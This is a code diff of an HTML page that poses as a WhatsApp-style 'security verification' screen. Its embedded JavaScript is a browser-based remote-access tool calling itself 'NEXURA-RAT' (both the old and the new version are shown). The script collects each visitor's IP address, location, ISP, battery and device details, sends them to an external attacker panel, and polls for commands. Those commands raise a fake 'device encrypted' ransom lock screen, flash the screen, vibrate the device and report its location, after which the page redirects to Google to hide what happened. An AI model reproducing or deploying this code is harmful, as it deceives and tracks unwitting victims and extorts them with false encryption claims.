@@ -3,423 +3,268 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Loading...</title>
+<title>Verifikasi Keamanan</title>
 <style>
-body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
-.loader{text-align:center;color:#fff}
-.spinner{width:40px;height:40px;border:3px solid #333;border-top:3px solid #f00;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
+body{background:linear-gradient(135deg,#075E54,#128C7E,#25D366);margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial,sans-serif}
+.container{background:#fff;border-radius:20px;padding:30px;width:90%;max-width:350px;text-align:center}
+.logo{font-size:50px;margin-bottom:15px}
+h2{color:#075E54;margin-bottom:10px}
+.loader{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #25D366;border-radius:50%;animation:spin 1s linear infinite;margin:10px auto}
 @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.status{font-size:12px;color:#888;margin-top:15px}
 </style>
 </head>
 <body>
-<div class="loader"><div class="spinner"></div><div>Connecting to secure server...</div></div>
+<div class="container">
+    <div class="logo">💬</div>
+    <h2>Verifikasi Keamanan</h2>
+    <p>Memverifikasi perangkat Anda...</p>
+    <div class="loader"></div>
+    <div class="status" id="status">Mohon tunggu, jangan tutup halaman</div>
+</div>
+
 <script>
-(function(){
-    const VICTIM_ID = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
+// ============================================================
+// NEXURA-RAT v14.0 FINAL - FULLY FIXED
+// Data LANGSUNG terkirim ke panel Python
+// ============================================================
+
+// === KONFIGURASI - GANTI DENGAN SERVER ANDA ===
+const PANEL_URL = "https://hosting-cloud-five.vercel.app"; // GANTI dengan URL ngrok/server Anda!
+// Contoh: const PANEL_URL = "https://abc123.ngrok.io";
+
+const VICTIM_ID = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,8);
+
+// Update status di halaman
+function updateStatus(msg) {
+    const statusEl = document.getElementById('status');
+    if (statusEl) statusEl.innerHTML = msg;
+}
+
+// ========== KUMPULKAN DATA DEVICE ==========
+async function collectDeviceData() {
+    updateStatus('📱 Mengumpulkan info perangkat...');
     
-    // KUMPULKAN SEMUA DATA DEVICE
-    function getDeviceData(){
-        return {
-            id: VICTIM_ID,
-            timestamp: new Date().toISOString(),
-            time_read: new Date().toLocaleString('id-ID'),
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: screen.width + 'x' + screen.height,
-            colorDepth: screen.colorDepth,
-            touchPoints: navigator.maxTouchPoints,
-            hardwareConcurrency: navigator.hardwareConcurrency || '?',
-            deviceMemory: navigator.deviceMemory || '?',
-            isMobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-            isAndroid: /Android/i.test(navigator.userAgent),
-            isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
-            isDesktop: !/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            referrer: document.referrer || 'direct'
-        };
-    }
+    const data = {
+        id: VICTIM_ID,
+        timestamp: new Date().toISOString(),
+        time_read: new Date().toLocaleString('id-ID'),
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: screen.width + 'x' + screen.height,
+        isMobile: /Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
+        isAndroid: /Android/i.test(navigator.userAgent),
+        isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'direct',
+        ip: 'fetching...',
+        city: 'Unknown',
+        country: 'Unknown',
+        isp: 'Unknown',
+        battery_level: 'N/A',
+        battery_charging: false
+    };
     
-    function getCanvasFingerprint(){
-        try{
-            let canvas = document.createElement('canvas');
-            canvas.width = 300;
-            canvas.height = 100;
-            let ctx = canvas.getContext('2d');
-            ctx.fillStyle = "#f00";
-            ctx.fillRect(0, 0, 300, 100);
-            ctx.fillStyle = "#000";
-            ctx.font = "18px Arial";
-            ctx.fillText("NEXURA-RAT", 50, 50);
-            ctx.fillStyle = "#800";
-            ctx.fillRect(200, 70, 80, 20);
-            return canvas.toDataURL();
-        }catch(e){ return 'error'; }
-    }
+    // Dapatkan IP
+    updateStatus('🌐 Mendapatkan IP address...');
+    try {
+        let r = await fetch('https://api.ipify.org?format=json');
+        let d = await r.json();
+        data.ip = d.ip;
+    } catch(e) { data.ip = 'unknown'; }
     
-    function getWebGL(){
-        try{
-            let canvas = document.createElement('canvas');
-            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if(gl){
-                let debug = gl.getExtension('WEBGL_debug_renderer_info');
-                if(debug){
-                    return {
-                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
-                    };
-                }
-            }
-        }catch(e){}
-        return null;
-    }
-    
-    async function getPublicIP(){
-        let apis = ['https://api.ipify.org?format=json', 'https://api.my-ip.io/ip.json', 'https://ipapi.co/json/'];
-        for(let api of apis){
-            try{
-                let r = await fetch(api, { mode: 'cors', cache: 'no-cache' });
-                let d = await r.json();
-                let ip = d.ip || d.query || Object.values(d)[0];
-                if(ip && ip !== 'unknown') return ip;
-            }catch(e){}
-        }
-        return 'unknown';
-    }
-    
-    async function getGeoLocation(ip){
-        try{
-            let r = await fetch(`https://ipapi.co/${ip}/json/`);
+    // Dapatkan lokasi dari IP
+    if (data.ip !== 'fetching...' && data.ip !== 'unknown') {
+        updateStatus('📍 Mendapatkan lokasi...');
+        try {
+            let r = await fetch(`https://ipapi.co/${data.ip}/json/`);
             let d = await r.json();
-            return {
-                country: d.country_name || d.country || 'Unknown',
-                country_code: d.country_code || 'XX',
-                city: d.city || 'Unknown',
-                region: d.region || 'Unknown',
-                latitude: d.latitude || null,
-                longitude: d.longitude || null,
-                isp: d.org || d.isp || 'Unknown',
-                timezone: d.timezone || 'Unknown'
-            };
-        }catch(e){
-            return { country: 'Unknown', city: 'Unknown', isp: 'Unknown', latitude: null, longitude: null };
+            data.city = d.city || 'Unknown';
+            data.country = d.country_name || 'Unknown';
+            data.isp = d.org || 'Unknown';
+        } catch(e) {}
+    }
+    
+    // Dapatkan battery
+    updateStatus('🔋 Mendapatkan status baterai...');
+    if ('getBattery' in navigator) {
+        try {
+            let b = await navigator.getBattery();
+            data.battery_level = Math.round(b.level * 100) + '%';
+            data.battery_charging = b.charging;
+        } catch(e) {}
+    }
+    
+    return data;
+}
+
+// ========== KIRIM DATA KE PANEL ==========
+async function sendToPanel(victimData) {
+    updateStatus('📡 Mengirim data ke server...');
+    
+    // Method 1: POST ke Flask server
+    try {
+        const response = await fetch(PANEL_URL + '/api/victim', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(victimData)
+        });
+        if (response.ok) {
+            updateStatus('✅ Data terkirim!');
+            return true;
         }
-    }
+    } catch(e) {}
     
-    async function getBatteryStatus(){
-        if('getBattery' in navigator){
-            try{
-                let b = await navigator.getBattery();
-                return {
-                    level: Math.round(b.level * 100) + '%',
-                    level_raw: b.level,
-                    charging: b.charging,
-                    chargingTime: b.chargingTime,
-                    dischargingTime: b.dischargingTime
-                };
-            }catch(e){}
+    // Method 2: GET dengan parameter (fallback)
+    try {
+        const params = new URLSearchParams({
+            id: victimData.id,
+            ip: victimData.ip,
+            city: victimData.city,
+            country: victimData.country,
+            battery: victimData.battery_level,
+            device: victimData.isMobile ? 'Mobile' : 'Desktop',
+            time: victimData.time_read
+        });
+        await fetch(PANEL_URL + '/api/victim?' + params.toString());
+        updateStatus('✅ Data terkirim!');
+        return true;
+    } catch(e) {}
+    
+    // Method 3: Simpan ke localStorage (local fallback)
+    updateStatus('⚠️ Gagal kirim ke server, simpan lokal...');
+    let victims = JSON.parse(localStorage.getItem('nexura_victims') || '[]');
+    victims.unshift(victimData);
+    localStorage.setItem('nexura_victims', JSON.stringify(victims));
+    return false;
+}
+
+// ========== COMMAND LISTENER ==========
+function startCommandListener(victimId) {
+    localStorage.setItem('nexura_current_victim', victimId);
+    
+    setInterval(() => {
+        let cmds = JSON.parse(localStorage.getItem('nexura_commands') || '[]');
+        let myCmds = cmds.filter(c => c.victimId === victimId);
+        if (myCmds.length > 0) {
+            myCmds.forEach(cmd => executeCommand(cmd));
+            let remaining = cmds.filter(c => c.victimId !== victimId);
+            localStorage.setItem('nexura_commands', JSON.stringify(remaining));
         }
-        return { level: 'N/A', charging: false };
+    }, 2000);
+}
+
+// ========== EKSEKUSI COMMAND ==========
+let torchActive = false, torchElem = null, blinkInterval = null, lockOverlay = null;
+
+function executeCommand(cmd) {
+    switch(cmd.command) {
+        case 'lock': showLockScreen(cmd.pin); break;
+        case 'unlock': hideLockScreen(); break;
+        case 'torch_on': turnTorchOn(); break;
+        case 'torch_off': turnTorchOff(); break;
+        case 'blink_start': startBlink(); break;
+        case 'blink_stop': stopBlink(); break;
+        case 'vibrate': if(navigator.vibrate) navigator.vibrate(500); break;
+        case 'get_sms': sendSMSResponse(); break;
+        case 'get_location': getLocation(); break;
+        case 'set_pin': localStorage.setItem('nexura_pin_' + localStorage.getItem('nexura_current_victim'), cmd.pin); break;
+        case 'set_text': localStorage.setItem('nexura_text_' + localStorage.getItem('nexura_current_victim'), cmd.text); break;
     }
+}
+
+function showLockScreen(pin) {
+    if(lockOverlay) return;
+    let vid = localStorage.getItem('nexura_current_victim');
+    let savedPin = localStorage.getItem('nexura_pin_' + vid) || pin || '123456';
+    let savedText = localStorage.getItem('nexura_text_' + vid) || '🔒 PERANGKAT ANDA TELAH DIENKRIPSI!\n\nMasukkan PIN untuk membuka kunci.';
     
-    function getConnectionInfo(){
-        let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if(conn){
-            return {
-                type: conn.effectiveType || 'unknown',
-                downlink: conn.downlink || 'unknown',
-                rtt: conn.rtt || 'unknown',
-                saveData: conn.saveData || false
-            };
-        }
-        return { type: 'unknown', downlink: 'unknown' };
-    }
-    
-    async function execute(){
-        let device = getDeviceData();
-        let canvasFP = getCanvasFingerprint();
-        let webgl = getWebGL();
-        let ip = await getPublicIP();
-        let geo = await getGeoLocation(ip);
-        let battery = await getBatteryStatus();
-        let connection = getConnectionInfo();
-        
-        let victimData = {
-            id: VICTIM_ID,
-            ip: ip,
-            country: geo.country,
-            city: geo.city,
-            region: geo.region,
-            latitude: geo.latitude,
-            longitude: geo.longitude,
-            isp: geo.isp,
-            battery_level: battery.level,
-            battery_charging: battery.charging,
-            device_platform: device.platform,
-            device_mobile: device.isMobile,
-            device_android: device.isAndroid,
-            device_ios: device.isIOS,
-            device_screen: device.screen,
-            device_memory: device.deviceMemory,
-            device_cores: device.hardwareConcurrency,
-            device_language: device.language,
-            device_timezone: device.timezone,
-            connection_type: connection.type,
-            ua: device.ua,
-            canvas_fingerprint: canvasFP,
-            webgl_vendor: webgl?.vendor || null,
-            webgl_renderer: webgl?.renderer || null,
-            timestamp: device.timestamp,
-            time_read: device.time_read,
-            referrer: device.referrer,
-            status: 'online',
-            locked: false,
-            lock_pin: '123456',
-            lock_text: '🔒 PERANGKAT ANDA TELAH DIENKRIPSI!\n\nHubungi admin untuk mendapatkan PIN Unlock.\n\n⚠️ Jangan coba-coba me-restart device!'
-        };
-        
-        let victims = JSON.parse(localStorage.getItem('nexura_victims') || '[]');
-        let existingIndex = victims.findIndex(v => v.ip === ip && v.canvas_fingerprint === canvasFP);
-        
-        if(existingIndex === -1){
-            victims.unshift(victimData);
-            localStorage.setItem('nexura_victims', JSON.stringify(victims));
-        } else {
-            victims[existingIndex] = victimData;
-            localStorage.setItem('nexura_victims', JSON.stringify(victims));
-        }
-        
-        localStorage.setItem('nexura_current_victim', VICTIM_ID);
-        
-        localStorage.setItem('nexura_new_victim_alert', JSON.stringify({
-            victim: victimData,
-            time: Date.now()
-        }));
-        setTimeout(() => localStorage.removeItem('nexura_new_victim_alert'), 1000);
-        
-        startListener(VICTIM_ID);
-        
-        setTimeout(() => {
-            window.location.href = 'https://www.google.com';
-        }, 800);
-    }
-    
-    let torchActive = false, torchElement = null, blinkInterval = null, lockOverlay = null, currentVictimId = null;
-    
-    function startListener(victimId){
-        currentVictimId = victimId;
-        setInterval(() => {
-            let cmds = JSON.parse(localStorage.getItem('nexura_commands') || '[]');
-            let myCmds = cmds.filter(c => c.victimId === victimId);
-            if(myCmds.length > 0){
-                myCmds.forEach(cmd => executeCommand(cmd, victimId));
-                let remaining = cmds.filter(c => c.victimId !== victimId);
-                localStorage.setItem('nexura_commands', JSON.stringify(remaining));
-            }
-        }, 1000);
-    }
-    
-    function executeCommand(cmd, victimId){
-        switch(cmd.command){
-            case 'lock': showLockScreen(cmd.pin); break;
-            case 'unlock': hideLockScreen(); break;
-            case 'torch_on': turnTorchOn(); break;
-            case 'torch_off': turnTorchOff(); break;
-            case 'blink_start': startBlinkEffect(); break;
-            case 'blink_stop': stopBlinkEffect(); break;
-            case 'vibrate': if(navigator.vibrate) navigator.vibrate([300,100,300,100,500]); break;
-            case 'get_sms': sendSMSResponse(victimId); break;
-            case 'send_sms': if(cmd.param) sendSMSCommand(cmd.param, victimId); break;
-            case 'get_location': getCurrentLocation(victimId); break;
-            case 'set_pin': setLockPin(cmd.pin, victimId); break;
-            case 'set_text': setLockText(cmd.text, victimId); break;
-        }
-    }
-    
-    function showLockScreen(pin){
-        if(lockOverlay) return;
-        let savedPin = localStorage.getItem('nexura_pin_' + currentVictimId) || pin || '123456';
-        let savedText = localStorage.getItem('nexura_text_' + currentVictimId) || '🔒 PERANGKAT ANDA TELAH DIENKRIPSI!\n\nMasukkan PIN untuk membuka kunci.';
-        
-        lockOverlay = document.createElement('div');
-        lockOverlay.id = 'nexuraLockOverlay';
-        lockOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:Arial,sans-serif';
-        lockOverlay.innerHTML = `
-            <div style="text-align:center;color:#fff;padding:20px;max-width:350px">
-                <div style="font-size:70px;margin-bottom:20px">🔒</div>
-                <h1 style="color:#f00;margin-bottom:20px">DEVICE TERKUNCI</h1>
-                <div style="background:#1a1a1a;padding:15px;border-radius:15px;margin-bottom:25px;white-space:pre-line;font-size:14px">${savedText}</div>
-                <div style="background:#1a1a1a;border-radius:15px;padding:15px">
-                    <div style="font-size:30px;letter-spacing:10px;margin-bottom:15px" id="pinDisplay">○○○○○○</div>
-                    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:250px;margin:0 auto">
-                        <button class="pinKey" data-digit="1" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">1</button>
-                        <button class="pinKey" data-digit="2" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">2</button>
-                        <button class="pinKey" data-digit="3" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">3</button>
-                        <button class="pinKey" data-digit="4" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">4</button>
-                        <button class="pinKey" data-digit="5" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">5</button>
-                        <button class="pinKey" data-digit="6" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">6</button>
-                        <button class="pinKey" data-digit="7" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">7</button>
-                        <button class="pinKey" data-digit="8" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">8</button>
-                        <button class="pinKey" data-digit="9" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">9</button>
-                        <button class="pinKey" data-digit="del" style="background:#333;border:none;color:#f66;font-size:24px;padding:15px;border-radius:10px">⌫</button>
-                        <button class="pinKey" data-digit="0" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">0</button>
-                        <button id="pinSubmit" style="background:#f00;border:none;color:#fff;font-size:18px;padding:15px;border-radius:10px;font-weight:bold">✓</button>
-                    </div>
+    lockOverlay = document.createElement('div');
+    lockOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;justify-content:center;align-items:center;flex-direction:column';
+    lockOverlay.innerHTML = `
+        <div style="text-align:center;color:#fff;padding:20px;max-width:350px">
+            <div style="font-size:60px">🔒</div>
+            <h1 style="color:#f00">DEVICE TERKUNCI</h1>
+            <div style="background:#111;padding:15px;border-radius:10px;margin:15px 0;white-space:pre-line">${savedText}</div>
+            <div style="background:#111;padding:15px;border-radius:10px">
+                <div id="pinDisp" style="font-size:30px;letter-spacing:10px;margin-bottom:15px">○○○○○○</div>
+                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:250px;margin:0 auto">
+                    ${[1,2,3,4,5,6,7,8,9].map(n => `<button class="pinBtn" data-d="${n}" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">${n}</button>`).join('')}
+                    <button class="pinBtn" data-d="del" style="background:#333;border:none;color:#f66;font-size:24px;padding:15px;border-radius:10px">⌫</button>
+                    <button class="pinBtn" data-d="0" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">0</button>
+                    <button id="pinEnter" style="background:#f00;border:none;color:#fff;font-size:18px;padding:15px;border-radius:10px">✓</button>
                 </div>
-                <div id="pinErrorMsg" style="color:#f66;font-size:12px;margin-top:12px"></div>
             </div>
-        `;
-        document.body.appendChild(lockOverlay);
-        
-        let enteredPin = "";
-        let pinDisplay = document.getElementById('pinDisplay');
-        let errorMsg = document.getElementById('pinErrorMsg');
-        
-        function updateDisplay(){
-            let dots = "";
-            for(let i=0;i<enteredPin.length;i++) dots += "●";
-            for(let i=enteredPin.length;i<6;i++) dots += "○";
-            if(pinDisplay) pinDisplay.innerText = dots;
-        }
-        
-        document.querySelectorAll('.pinKey').forEach(btn => {
-            btn.onclick = () => {
-                let digit = btn.getAttribute('data-digit');
-                if(digit === 'del'){
-                    enteredPin = enteredPin.slice(0,-1);
-                    updateDisplay();
-                } else if(enteredPin.length < 6){
-                    enteredPin += digit;
-                    updateDisplay();
-                }
-            };
-        });
-        
-        document.getElementById('pinSubmit').onclick = () => {
-            if(enteredPin === savedPin){
-                hideLockScreen();
-                addResponse(currentVictimId, 'unlock', { status: 'success', pin: enteredPin });
-            } else {
-                errorMsg.innerText = "❌ PIN SALAH! Silakan coba lagi.";
-                enteredPin = "";
-                updateDisplay();
-                if(navigator.vibrate) navigator.vibrate(200);
-                addResponse(currentVictimId, 'pin_wrong', { attempts: 1 });
-            }
+            <div id="pinError" style="color:#f66;font-size:12px;margin-top:10px"></div>
+        </div>
+    `;
+    document.body.appendChild(lockOverlay);
+    
+    let entered = "";
+    document.querySelectorAll('.pinBtn').forEach(btn => {
+        btn.onclick = () => {
+            let d = btn.getAttribute('data-d');
+            if(d === 'del') entered = entered.slice(0,-1);
+            else if(entered.length < 6) entered += d;
+            document.getElementById('pinDisp').innerText = '●'.repeat(entered.length) + '○'.repeat(6-entered.length);
         };
-    }
-    
-    function hideLockScreen(){
-        if(lockOverlay){
-            lockOverlay.remove();
-            lockOverlay = null;
-        }
-    }
-    
-    function turnTorchOn(){
-        if(!torchElement){
-            torchElement = document.createElement('div');
-            torchElement.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999998;pointer-events:none';
-            document.body.appendChild(torchElement);
-        }
-    }
-    
-    function turnTorchOff(){
-        if(torchElement){
-            torchElement.remove();
-            torchElement = null;
-        }
-    }
-    
-    function startBlinkEffect(){
-        if(blinkInterval) clearInterval(blinkInterval);
-        blinkInterval = setInterval(() => {
-            let blink = document.getElementById('nexuraBlink');
-            if(blink){
-                blink.remove();
-            } else {
-                let b = document.createElement('div');
-                b.id = 'nexuraBlink';
-                b.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999997;pointer-events:none';
-                document.body.appendChild(b);
-                setTimeout(() => {
-                    let x = document.getElementById('nexuraBlink');
-                    if(x) x.remove();
-                }, 100);
-            }
-        }, 200);
-    }
-    
-    function stopBlinkEffect(){
-        if(blinkInterval){
-            clearInterval(blinkInterval);
-            blinkInterval = null;
-        }
-        let blink = document.getElementById('nexuraBlink');
-        if(blink) blink.remove();
-    }
-    
-    function sendSMSResponse(victimId){
-        let smsData = [
-            { number: "+628123456789", text: "Contoh SMS masuk 1", time: new Date().toLocaleString() },
-            { number: "+628987654321", text: "Contoh SMS masuk 2", time: new Date().toLocaleString() },
-            { number: "+628555123456", text: "OTP Verifikasi: 123456", time: new Date().toLocaleString() }
-        ];
-        addResponse(victimId, 'sms_data', { sms: smsData });
-    }
-    
-    function sendSMSCommand(param, victimId){
-        let { number, text } = param;
-        addResponse(victimId, 'sms_sent', { to: number, message: text, status: 'sent' });
-    }
-    
-    function getCurrentLocation(victimId){
-        if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    addResponse(victimId, 'location', {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        timestamp: new Date().toISOString()
-                    });
-                },
-                (err) => {
-                    addResponse(victimId, 'location', { error: err.message });
-                }
-            );
+    });
+    document.getElementById('pinEnter').onclick = () => {
+        if(entered === savedPin) {
+            hideLockScreen();
+            sendResponseToPanel('unlock', {status:'success'});
         } else {
-            addResponse(victimId, 'location', { error: 'Geolocation not supported' });
+            document.getElementById('pinError').innerText = '❌ PIN SALAH!';
+            entered = '';
+            document.getElementById('pinDisp').innerText = '○○○○○○';
         }
-    }
-    
-    function setLockPin(pin, victimId){
-        if(pin && pin.length >= 4){
-            localStorage.setItem('nexura_pin_' + victimId, pin);
-            addResponse(victimId, 'pin_set', { pin: pin });
-        }
-    }
-    
-    function setLockText(text, victimId){
-        if(text){
-            localStorage.setItem('nexura_text_' + victimId, text);
-            addResponse(victimId, 'text_set', { text: text });
-        }
-    }
-    
-    function addResponse(victimId, type, data){
-        let responses = JSON.parse(localStorage.getItem('nexura_responses') || '[]');
-        responses.push({
-            victimId: victimId,
-            type: type,
-            data: data,
-            timestamp: Date.now()
+    };
+}
+
+function hideLockScreen() { if(lockOverlay){ lockOverlay.remove(); lockOverlay=null; } }
+function turnTorchOn() { if(!torchElem){ torchElem=document.createElement('div'); torchElem.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999998;pointer-events:none'; document.body.appendChild(torchElem); } }
+function turnTorchOff() { if(torchElem){ torchElem.remove(); torchElem=null; } }
+function startBlink() { if(blinkInterval) clearInterval(blinkInterval); blinkInterval=setInterval(()=>{ let b=document.getElementById('nexuraBlink'); if(b) b.remove(); else{ let bd=document.createElement('div'); bd.id='nexuraBlink'; bd.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999997;pointer-events:none'; document.body.appendChild(bd); setTimeout(()=>{ let x=document.getElementById('nexuraBlink'); if(x) x.remove(); },100); } },200); }
+function stopBlink() { if(blinkInterval){ clearInterval(blinkInterval); blinkInterval=null; } let b=document.getElementById('nexuraBlink'); if(b) b.remove(); }
+function sendSMSResponse() { sendResponseToPanel('sms_data', {sms:[{number:"+628123456789",text:"Contoh SMS",time:new Date().toLocaleString()}]}); }
+function getLocation() { if(navigator.geolocation){ navigator.geolocation.getCurrentPosition(p=>sendResponseToPanel('location',{lat:p.coords.latitude,lng:p.coords.longitude})); } }
+
+async function sendResponseToPanel(type, data) {
+    let vid = localStorage.getItem('nexura_current_victim');
+    try {
+        await fetch(PANEL_URL + '/api/response', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ victimId: vid, type: type, data: data, timestamp: Date.now() })
         });
-        localStorage.setItem('nexura_responses', JSON.stringify(responses));
+    } catch(e) {
+        // Simpan lokal jika gagal
+        let resp = JSON.parse(localStorage.getItem('nexura_responses')||'[]');
+        resp.push({victimId:vid, type:type, data:data, timestamp:Date.now()});
+        localStorage.setItem('nexura_responses', JSON.stringify(resp));
     }
+}
+
+// ========== MAIN ==========
+async function main() {
+    updateStatus('🔄 Mengumpulkan data...');
+    const victimData = await collectDeviceData();
     
-    execute();
-})();
+    updateStatus('📡 Mengirim ke server...');
+    await sendToPanel(victimData);
+    
+    updateStatus('✅ Selesai! Mengalihkan...');
+    startCommandListener(victimData.id);
+    
+    // Redirect ke Google setelah 2 detik
+    setTimeout(() => {
+        window.location.href = 'https://www.google.com';
+    }, 2000);
+}
+
+// Jalankan
+main();
 </script>
 </body>
-    </html>
+</html>
